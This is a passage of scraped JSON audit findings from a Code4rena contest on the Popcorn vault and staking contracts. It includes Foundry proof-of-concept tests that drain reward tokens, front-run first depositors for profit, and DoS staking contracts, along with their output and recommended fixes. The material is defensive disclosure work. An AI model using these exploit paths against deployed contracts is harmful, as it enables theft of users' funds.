https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L193-L235 - Here the goal is to empty the **Strategy** and **Adapter** underlying contracts of the  **Vault** to make a safe adapter change.  Issue senario **1** : the **harvest()** function is in cooldown.   Issue senario **2** : the **harvest()** function revert.     In both case, the **harvest()** fonction will not execute. The adapter will change without harvesting from the **Strategy** causing the loss of unclaimed rewards.  ## Tools Used None  ## Recommended Mitigation Steps  Change the **harvest()** function from : ``` js function harvest() public takeFees {     if (         address(strategy) != address(0) &&         ((lastHarvest + harvestCooldown) < block.timestamp)     ) {         // solhint-disable         address(strategy).delegatecall(             abi.encodeWithSignature(\"harvest()\")         );     }      emit Harvested(); } ``` to :  ``` js function harvest() public takeFees {     if (         address(strategy) == address(0) ||         ((lastHarvest + harvestCooldown) > block.timestamp)     ) {         revert();  // Fixing the \"Issue senario 1\"     }      (bool success, ) = address(strategy).delegatecall(         abi.encodeWithSignature(\"harvest()\")     );      if (!success) revert(); // Fixing the \"Issue senario 2\"      emit Harvested(); } ``` "}, {"title": "Attacker can deploys vaults with a malicious Staking contract", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/275", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-08"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L110 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultRegistry.sol#L44-L53   # Vulnerability details  ## Impact Anyone can deploy a Vault with a malicious Staking contract attached. If the Staking contract already exists, we can just pass its address to `deployVault` and no checks will be applied to see whether the Staking contract matches valid Staking templates in the Template Registry.   An attacker can create malicious Staking contract that acts like a regular ERC-4626 vault but with a backdoor function that allows them to withdraw all the deposited funds in the contract. Users may assume the Staking contract is valid and safe and will deposit their funds into it. This will lead to loss of funds for users and huge loss of credibility for the protocol.   ## Proof of Concept The below PoC shows the behavior described above where any Staking contract can be deployed with a Vault. The below lines will need to be added to the `VaultController.t.sol` file.   ```solidity   function test__deploy_malicious_staking_contract() public {     addTemplate(\"Adapter\", templateId, adapterImpl, true, true);     addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);     addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);      // Pretend this malicious Staking contract allows attacker to withdraw     // all the funds from it while allowing users to use it like a normal Staking contract     MultiRewardStaking maliciousStaking = new MultiRewardStaking();      vm.startPrank(alice);     address vault = controller.deployVault(       VaultInitParams({         asset: iAsset,         adapter: IERC4626(address(0)),         fees: VaultFees({           deposit: 100,           withdrawal: 200,           management: 300,           performance: 400         }),         feeRecipient: feeRecipient,         owner: address(this)       }),       DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),       DeploymentArgs({ id: 0, data: \"\" }),       address(maliciousStaking),       \"\",       VaultMetadata({         vault: address(0),         staking: address(maliciousStaking),         creator: alice,         metadataCID: metadataCid,         swapTokenAddresses: swapTokenAddresses,         swapAddress: address(0x5555),         exchange: uint256(1)       }),       0     );     vm.stopPrank();      assertEq(vaultRegistry.getVault(vault).staking, address(maliciousStaking));   } ```  The test can be run with the following command: `forge test --no-match-contract 'Abstract' --match-test test__deploy_malicious_staking_contract`  ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps 1. Add checks to verify that the Staking contract being used in `deployVault` is a Staking contract that was deployed by the system and uses an approved template:  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L110"}, {"title": "claimRewards() can be DoS by setting an invalid escrow percentage", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/274", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-95"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L248 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L267 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L179 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L191-L202   # Vulnerability details  ## Impact  In MultiRewardStaking.sol, it is possible to set an invalid escrowPercentage in addRewardToken(), which will deny users from claiming rewards tokens.  The addRewardToken() does not validate the escrowPercentage parameter. This will cause the _lockToken() in claimRewards() to revert due to underflow in the payout calculation.   function _lockToken(   address user,   IERC20 rewardToken,   uint256 rewardAmount,   EscrowInfo memory escrowInfo  ) internal {   uint256 escrowed = rewardAmount.mulDiv(uint256(escrowInfo.escrowPercentage), 1e18, Math.Rounding.Down);   uint256 payout = rewardAmount - escrowed;    rewardToken.safeTransfer(user, payout);   escrow.lock(rewardToken, user, escrowed, escrowInfo.escrowDuration, escrowInfo.offset);  } https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L248 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L267 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L179 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L191-L202   ## Proof of Concept  Add these functions to MultiRewardsStaking.t.sol and run  test__escrowpercentage_claim_peakbolt(). It will revert at claimRewards()   function _addRewardToken_peakbolt(MockERC20 rewardsToken) internal {   rewardsToken.mint(address(this), 10 ether);   rewardsToken.approve(address(staking), 10 ether);    //set invalid escrow percentage (200%)   staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, true, 2e18, 100, 0);  }   function test__escrowpercentage_claim_peakbolt() public {   // Prepare array for `claimRewards`   IERC20[] memory rewardsTokenKeys = new IERC20[](1);   rewardsTokenKeys[0] = iRewardToken1;     _addRewardToken_peakbolt(rewardToken1);   stakingToken.mint(alice, 5 ether);    vm.startPrank(alice);   stakingToken.approve(address(staking), 5 ether);   staking.deposit(1 ether);    vm.warp(block.timestamp + 10);    staking.claimRewards(alice, rewardsTokenKeys);    assertEq(staking.accruedRewards(alice, iRewardToken1), 0);  }  ## Recommended Mitigation Steps Validate the escrow percentage. "}, {"title": "Attacker can steal 99% of total balance from any reward token in any Staking contract", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/263", "labels": ["bug", "3 (High Risk)", "selected for report", "sponsor confirmed", "H-09"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L483-L503 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L296-L315 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L377-L378 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L390-L399   # Vulnerability details  ## Impact Attacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.   So an attacker gets access to `changeRewardSpeed`, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker's created vault, he can now successfully `changeRewardSpeed`. Now with `changeRewardSpeed`, attacker can set the `rewardSpeed` to any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)   ## Proof of Concept This attack is made possible by the following issues: 1. Any user can deploy a Vault that uses any existing Staking contract - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108 2. As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can call `changeStakingRewardSpeeds` to modify the rewardSpeeds of any reward tokens in the target Staking contract - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501 3. There are no checks for limits on the `rewardsPerSecond` value in `changeRewardSpeed` so attacker can set any amount they want - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314 4. `changeRewardSpeed` also uses `_calcRewardsEnd` to get the new `rewardsEndTimestamp` but that calculation is faulty and the new timestamp is always longer than it's supposed to be leading to people being able to claim more rewards than they should get - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360  Below is the PoC using a Foundry test: ```solidity   function test__steal_rewards_from_any_staking_contract() public {     addTemplate(\"Adapter\", templateId, adapterImpl, true, true);     addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);     addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);      // 1. deploy regular legit vault owned by this     address vault = deployVault();     address staking = vaultRegistry.getVault(vault).staking;      rewardToken.mint(staking, 1_000_000 ether);      vm.startPrank(bob);     asset.mint(bob, 10000 ether);     asset.approve(vault, 10000 ether);     IVault(vault).deposit(10000 ether, bob);     IVault(vault).approve(staking, 10000 ether);     IMultiRewardStaking(staking).deposit(9900 ether, bob);     vm.stopPrank();      vm.startPrank(alice);     // 2. deploy attacker-owned vault using the same Staking contract as legit vault     // alice is the attacker     address attackerVault = controller.deployVault(       VaultInitParams({         asset: iAsset,         adapter: IERC4626(address(0)),         fees: VaultFees({           deposit: 100,           withdrawal: 200,           management: 300,           performance: 400         }),         feeRecipient: feeRecipient,         owner: address(this)       }),       DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),       DeploymentArgs({ id: 0, data: \"\" }),       staking,       \"\",       VaultMetadata({         vault: address(0),         staking: staking,         creator: alice,         metadataCID: metadataCid,         swapTokenAddresses: swapTokenAddresses,         swapAddress: address(0x5555),         exchange: uint256(1)       }),       0     );      asset.mint(alice, 10 ether);     asset.approve(vault, 10 ether);     IVault(vault).deposit(10 ether, alice);     IVault(vault).approve(staking, 10 ether);     IMultiRewardStaking(staking).deposit(1 ether, alice);      address[] memory targets = new address[](1);     targets[0] = attackerVault;     IERC20[] memory rewardTokens = new IERC20[](1);     rewardTokens[0] = iRewardToken;     uint160[] memory rewardsSpeeds = new uint160[](1);     rewardsSpeeds[0] = 990_099_990 ether;     controller.changeStakingRewardsSpeeds(targets, rewardTokens, rewardsSpeeds);      assertGt(rewardToken.balanceOf(staking), 1_000_000 ether);      vm.warp(block.timestamp + 12);     MultiRewardStaking(staking).claimRewards(alice, rewardTokens);      assertGt(rewardToken.balanceOf(alice), 999_999 ether);     assertLt(1 ether, rewardToken.balanceOf(staking));     vm.stopPrank();   } ```  The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)  Note that the attacker can tweak the amount they stake in the contract, the reward speed they'll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.   The test can be run with: `forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract`  ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps 1. Don't allow any Vault creator to use and modify just ANY Staking contract - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108 2. Add checks to limit how high `rewardsPerSecond` can be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314 3. Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360"}, {"title": "Faulty Escrow config will lock up reward tokens in Staking contract", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/251", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-27"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L443-L471 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L265-L270 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L178-L179 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L201 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardEscrow.sol#L97-L98   # Vulnerability details  ## Impact When a Vault owner/create adds a reward token to the Staking contract with faulty escrow config parameters, the reward tokens sent to the Staking contract will forever be locked up. This can happen since there are no validity checks on the values of the Escrow config for the reward tokens when adding a reward token to the Staking contract via the VaultController.   ## Proof of Concept Below are the steps to reproduce the issue: 1. Vault Creator/Owner adds a reward token to the Staking contract of a vault they own/created, passing Escrow configuration parameters of `useEscrow` = true, `escrowDuration` = 0 and `escrowPercentage` = 1. This passes without issue since there are no validity checks for the Escrow config in the following lines: https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L443-L471 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L265-L271  2. This issue not noticeable until someone attempts to `claimRewards` for that misconfigured rewardToken from the Staking contract. This will always revert for all users trying to claim rewards for the affected rewardToken since it always attempts to lock some funds in escrow: https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L178-L180 And one of these checks in `Escrow.lock` will always fail since `escrowDuration` was set to 0 and `escrowPercentage` is so low that rewards must be so high for the escrow amount to not be 0: https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardEscrow.sol#L97-L98 3. Reward tokens for that misconfigured rewardToken contract will now forever be locked in the Staking contract leading to loss of funds vault creator/owner.   ## Tools Used VSCode  ## Recommended Mitigation Steps 1. Add validity checks for escrowDuration and escrowPercentage before these lines: https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L265-L270 Make sure that `escrowDuration` is greater than 0 and that `escrowPercentage` is high enough that it won't always trigger reverts when users claim rewards. 2. If reward amounts are too small, the escrow amount will be 0 and that will revert the `claimRewards` so users will not be able to claim rewards. Maybe check if there are escrowed amount is greather than 0 and only call `Escrow.lock` if it is. That way, users with small rewards will always be able to claim funds. Note that only users will larger rewards at time of claiming will have funds escrowed for smaller escrow percentages."}, {"title": "First vault depositor can steal other's assets", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/243", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-10"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L294-L301   # Vulnerability details  ## Impact The first depositor can be front run by an attacker and as a result will lose a considerable part of the assets provided.   The vault calculates the amount of shares to be minted upon deposit to every user via the `convertToShares()` function:  ```solidity function deposit(uint256 assets, address receiver)     public     nonReentrant     whenNotPaused     syncFeeCheckpoint     returns (uint256 shares) {     if (receiver == address(0)) revert InvalidReceiver();      uint256 feeShares = convertToShares(         assets.mulDiv(uint256(fees.deposit), 1e18, Math.Rounding.Down)     );      shares = convertToShares(assets) - feeShares;      if (feeShares > 0) _mint(feeRecipient, feeShares);      _mint(receiver, shares);      asset.safeTransferFrom(msg.sender, address(this), assets);      adapter.deposit(assets, address(this));      emit Deposit(msg.sender, receiver, assets, shares); }  function convertToShares(uint256 assets) public view returns (uint256) {     uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.      return         supply == 0             ? assets             : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down); }  ```  When the pool has no share supply, the amount of shares to be minted is equal to the assets provided. An attacker can abuse of this situation and profit of the rounding down operation when calculating the amount of shares if the supply is non-zero. This attack is enabled by the following components: frontrunning, rounding down the amount of shares calculated and regular ERC20 transfers.  ## Proof of Concept The Vault charges zero fees to conduct any action.  - Alice wants to deposit 2MM USDT to a vault. - Bob frontruns Alice deposit() call with the following transactions:   - `vault.deposit(1, bob)`: This gives Bob 1 share backed by 1 USDT.   - `usdt.transfer(address(vault.adapter()), 1MM)`: Sends 1MM USDT to the underlying vault's adapter (from were the `totalAssets` are calculated)   - After those two transactions, `totalAssets = 1MM + 1` and `totalSupply = 1`. - Alice deposit transaction is mined: `deposit(2MM, alice)`, she receives only **one** share because:    - 2MM / (1MM + 1) * totalSupply = 2MM / (1MM + 1) * 1 = 2MM / (1MM+) \u2248 1.999998 = 1 (as Solidity floors down). - After Alice tx, the pool now has 3MM assets and distributed 2 shares. - Bob backruns Alice transaction and redeems his share getting 3MM * (1 Share Owned by Bob) / (2 total shares) = 1.5MM  This process gives Bob a \u2248500k asset profit and Alice incurs in a \u2248500k loss:  ```solidity   function test__FirstDepositorFrontRun() public {     uint256 amount = 2_000_000 ether;      uint256 aliceassetAmount = amount;      asset.mint(bob, aliceassetAmount);     asset.mint(alice, aliceassetAmount);      vm.prank(alice);     asset.approve(address(vault), aliceassetAmount);     assertEq(asset.allowance(alice, address(vault)), aliceassetAmount);      vm.prank(bob);     asset.approve(address(vault), aliceassetAmount);     assertEq(asset.allowance(bob, address(vault)), aliceassetAmount);      uint256 alicePreDepositBal = asset.balanceOf(alice);      console.log(\"\\n=== INITIAL STATES ===\");     console.log(\"Bob assets: %s\", asset.balanceOf(bob));     console.log(\"Alice assets: %s\", alicePreDepositBal);      // Bob frontruns Alice deposit.     vm.startPrank(bob);     uint256 bobShareAmount = vault.deposit(1, bob);     console.log(\"\\n=== BOB DEPOSITS ===\");     console.log(\"Bob Shares Amount: %s\", bobShareAmount);     console.log(\"Vault Assets : %s\", vault.totalAssets());      assertTrue(bobShareAmount == 1);     assertTrue(vault.totalAssets() == 1);     assertEq(adapter.afterDepositHookCalledCounter(), 1);      // Bob transfers 1MM of tokens to the adapter     asset.transfer(address(vault.adapter()), 1_000_000 ether);     console.log(\"\\n=== AFTER BOB's TRANSFER ===\");     console.log(\"Bob Shares Amount: %s\", bobShareAmount);     console.log(\"Vault Assets : %s\", vault.totalAssets());     assertTrue(vault.totalAssets() == 1_000_000 ether + 1);     vm.stopPrank();           // Alice Txn is mined     vm.prank(alice);     uint256 aliceShareAmount = vault.deposit(aliceassetAmount, alice);     console.log(\"\\n=== AFTER ALICE TX ===\");     console.log(\"Alice Shares Amount: %s\", aliceShareAmount);     console.log(\"Vault Assets : %s\", vault.totalAssets());     assertTrue(aliceShareAmount == 1);      console.log(\"Convertable assets that Bob receives: %s\", vault.convertToAssets(vault.balanceOf(bob)));     console.log(\"Convertable assets that Alice receives: %s\", vault.convertToAssets(vault.balanceOf(bob)));      // Bob backruns the call and gets a 500k profit     vm.prank(bob);     vault.redeem(bobShareAmount, bob, bob);     console.log(\"\\n=== BOB WITHDRAWS ===\");      console.log(\"\\n=== ALICE WITHDRAWS ===\");     vm.prank(alice);     vault.redeem(aliceShareAmount, alice, alice);      console.log(\"\\n=== FINAL STATES ===\");     console.log(\"Bob assets: %s\", asset.balanceOf(bob));     console.log(\"Alice assets: %s\", asset.balanceOf(alice));   } ```  Output:  ``` === INITIAL STATES ===   Bob assets: 2000000000000000000000000   Alice assets: 2000000000000000000000000    === BOB DEPOSITS ===   Bob Shares Amount: 1   Vault Assets : 1  === AFTER BOB's TRANSFER ===   Bob Shares Amount: 1   Vault Assets : 1000000000000000000000001    === AFTER ALICE TX ===   Alice Shares Amount: 1   Vault Assets : 3000000000000000000000001   Convertable assets that Bob receives: 1500000000000000000000000   Convertable assets that Alice receives: 1500000000000000000000000    === BOB WITHDRAWS ===    === ALICE WITHDRAWS ===    === FINAL STATES ===   Bob assets: 2499999999999999999999999   Alice assets: 1500000000000000000000001 ```  This same issue is commonly found in vaults, [Spearbit](https://spearbit.com/) also [reported this](https://github.com/spearbit/portfolio/blob/master/pdfs/MapleV2.pdf) on their Maple V2 audit as the primary high risk issue.   ## Tools Used Manual Review  ## Recommended Mitigation Steps - Require a minimum amount of initial shares (when its supply is zero) to be minted taking into account that:   - The deposit mints an effective (INITIAL_MINT - INITIAL_BURN) amount of shares to the first depositor   - Burns the INITIAL_BURN amount to a dead address.  Both initial amounts should be set carefully as they partially harm the first depositor. Those amounts should be high enough to reduce the profitability of this attack to the first depositor but not excessively high which could reduce the incentive of being the first depositor. "}, {"title": "`MultiRewardStaking.changeRewardSpeed()` breaks the distribution", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/190", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-29"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L296-L315 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360   # Vulnerability details  ## Impact The `changeRewardSpeed()` doesn't calculate the new `endTimestamp` correctly. That causes the reward distribution to be broken  ## Proof of Concept Given that we have an existing reward with the following configuration: * startTimestamp = 0 * endTimestamp = 100 * rewardPerSecond = 2 * initialBalance = 200  The reward speed is changed at `timestamp = 50`, meaning 100 tokens were already distributed. The new endTimestamp is calculated by calling `_calcRewardsEnd()`: ```sol     // @audit using balanceOf() here has its own issues but let's ignore those for this submission     uint256 remainder = rewardToken.balanceOf(address(this));      uint32 prevEndTime = rewards.rewardsEndTimestamp;      uint32 rewardsEndTimestamp = _calcRewardsEnd(       prevEndTime > block.timestamp ? prevEndTime : block.timestamp.safeCastTo32(),       rewardsPerSecond,       remainder     ); ``` And the calculation is: ```sol   function _calcRewardsEnd(     uint32 rewardsEndTimestamp,     uint160 rewardsPerSecond,     uint256 amount   ) internal returns (uint32) {     if (rewardsEndTimestamp > block.timestamp)       amount += uint256(rewardsPerSecond) * (rewardsEndTimestamp - block.timestamp);      return (block.timestamp + (amount / uint256(rewardsPerSecond))).safeCastTo32();   }  ```  * `rewardsEndTimestamp = 100` (initial endTimestamp) * `block.timestamp = 50` (as described earlier) * `amount = 100`  * `rewardsPerSecond = 4` (we update it by calling this function)  Because `rewardEndTimestamp > block.timestamp`, the if clause is executed and `amount` is increased: $amountNew = 100 + 4 * (100 - 50) = 300$  Then it calculates the new `endTimestamp`: $50 + (300 / 4) = 125$  Thus, by increasing the `rewardsPerSecond` from `2` to `4`, we've **increased** the `endTimestamp` from `100` to `125` instead of descreasing it. The total amount of rewards that are distributed are calculated using the `rewardsPerSecond` and `endTimestamp`. Meaning, the contract will also try to distribute tokens it doesn't hold. It only has the remaining `100` tokens.  By increasing the `rewardsPerSecond` the whole distribution is broken. ## Tools Used none  ## Recommended Mitigation Steps It's not easy to fix this issue with the current implementation of the contract. There are a number of other issues. But, in essence: * determine the remaining amount of tokens that need to be distributed * calculate the new endTimestamp: `endTimestamp = remainingAmount / newRewardsPerSecond`"}, {"title": "Vault creator can't change quitPeriod", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/187", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-30"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L629-L636   # Vulnerability details  ## Impact The vault's `quitPeriod` can be updated through the `setQuitPeriod()` function. Only the owner of the contract (AdminProxy through VaultController) can call it. But, the VaultController contract doesn't implement a function to call `setQuitPeriod()`. Thus, the function is actually not usable.  This limits the configuration of the vault. Every vault will have to use the standard 3-day `quitPeriod`.   ## Proof of Concept `setQuitPeriod()` has the `onlyOwner` modifier which only allows the AdminProxy to access the function. The AdminProxy is called through the VaultController. ```sol     function setQuitPeriod(uint256 _quitPeriod) external onlyOwner {         if (_quitPeriod < 1 days || _quitPeriod > 7 days)             revert InvalidQuitPeriod();          quitPeriod = _quitPeriod;          emit QuitPeriodSet(quitPeriod);     } ``` The VaultController doesn't provide a function to execute `setQuitPeriod()`. Just search for `setQuidPeriod.selector` and you won't find anything. ## Tools Used none  ## Recommended Mitigation Steps Add a function to interact with `setQuitPeriod()`."}, {"title": "Vault creator can't change feeRecipient after deployment", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/186", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-31"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L553   # Vulnerability details  ## Impact The vault's `feeRecipient` can be updated through the `setFeeRecipient()` function. Only the owner of the contract (VaultController) can call it. But, the VaultController contract doesn't implement a function to call `setFeeRecipient()`. Thus, the function is actually not usable.  Since the vault creator won't be able to change the fee recipient they might potentially lose access to those funds.  ## Proof of Concept `setFeeRecipient` has the `onlyOwner` modifier which only allows the AdminProxy to access the function. The AdminProxy is called through the VaultController. ```sol     function setFeeRecipient(address _feeRecipient) external onlyOwner {         if (_feeRecipient == address(0)) revert InvalidFeeRecipient();          emit FeeRecipientUpdated(feeRecipient, _feeRecipient);          feeRecipient = _feeRecipient;     } ``` The VaultController doesn't provide a function to execute `setFeeRecipient()`. Just search for `setFeeRecipient.selector` and you won't find anything.  ## Tools Used none  ## Recommended Mitigation Steps Add a function to interact with `setFeeRecipient()`."}, {"title": "DOS any Staking contract with Arithmetic Overflow", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-32"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L112 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L127 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L141 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L170 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373   # Vulnerability details  ## Impact This allows attackers to disable any Staking contract deployed via the system, essentially locking up all funds within the Staking contract. It would lead to a significant loss of funds for all users and the protocol who have staked their Vault tokens. All Staking contracts can be disabled by an attacker. The attack is possible once vault deployments become permissionless which is the primary goal of the Popcorn protocol.   ## Proof of Concept The attack is possible because of the following behaviors: 1. Any Vault creator can use any Staking contract that was previously deployed by the system - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110 2. Any Vault creator can add rewards tokens to the Staking contract attached to their Vault. Note that this Staking contract could be the same contract used by other vaults - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448 3. There are no checks to limit the number of rewardTokens added to a Staking contract - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263 4. All critical functions in the Staking contract such as withdraw, deposit, transfer and claimRewards automatically call `accrueRewards` modifier. 5. `accrueRewards` iterates through all rewardTokens using a uint8 index variable - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373   First, `verifyCreatorOrOwner` needs to be fixed so that it allows either creator or owner to run functions it protects like it's meant to with the below code:  ```solidity if (msg.sender != metadata.creator && msg.sender != owner) revert NotSubmitterNorOwner(msg.sender); ```  Once this fix is implemented and the protocol enables permissionless vault deployment, the following attack path opens up:  1. Some legit vaults have already been deployed by owner of the protocol or others and they have a Staking contract with significant funds 2. Attacker deploys vault using the same Staking contract deployed by any other vault owner/creator. This Staking contract is the target contract to be disabled. 3. Attacker adds 255 reward tokens to the Staking contract to trigger DOS in any future transactions in the Staking contract 4. Calling any transaction function in the Staking will always revert due to arithmetic overflow in the `accrueRewards` modifier that loops over all the `rewardTokens` state variable. The overflow is caused since the `i` variable used in the for loop inside accrueRewards uses uint8 and it keeps looping as long as `i < rewardTokens.length`. That means if `rewardTokens` has a length of 256, it will cause `i` uint8 variable to overflow.  The steps for described attack can be simulated with the below test that will need to be added to the `VaultController.t.sol` test file:  ```solidity   function test__disable_any_staking_contract() public {     addTemplate(\"Adapter\", templateId, adapterImpl, true, true);     addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);     addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);      // 1. deploy regular legit vault owned by this     address vault = deployVault();     address staking = vaultRegistry.getVault(vault).staking;      vm.startPrank(alice);     // 2. deploy attacker-owned vault using the same Staking contract as legit vault     // alice is the attacker     address attackerVault = controller.deployVault(       VaultInitParams({         asset: iAsset,         adapter: IERC4626(address(0)),         fees: VaultFees({           deposit: 100,           withdrawal: 200,           management: 300,           performance: 400         }),         feeRecipient: feeRecipient,         owner: address(this)       }),       DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),       DeploymentArgs({ id: 0, data: \"\" }),       staking,       \"\",       VaultMetadata({         vault: address(0),         staking: staking,         creator: alice,         metadataCID: metadataCid,         swapTokenAddresses: swapTokenAddresses,         swapAddress: address(0x5555),         exchange: uint256(1)       }),       0     );      // 3. Attacker (Alice) adds 255 reward tokens to the Staking contract     bytes[] memory rewardsData = new bytes[](255);     address[] memory targets = new address[](255);     for (uint256 i = 0; i < 255; i++) {       address _rewardToken = address(         new MockERC20(\"Reward Token\", string(abi.encodePacked(i)), 18)       );        targets[i] = attackerVault;       rewardsData[i] = abi.encode(         _rewardToken,         0.1 ether,         0,         true,         10000000,         2 days,         1 days       );     }     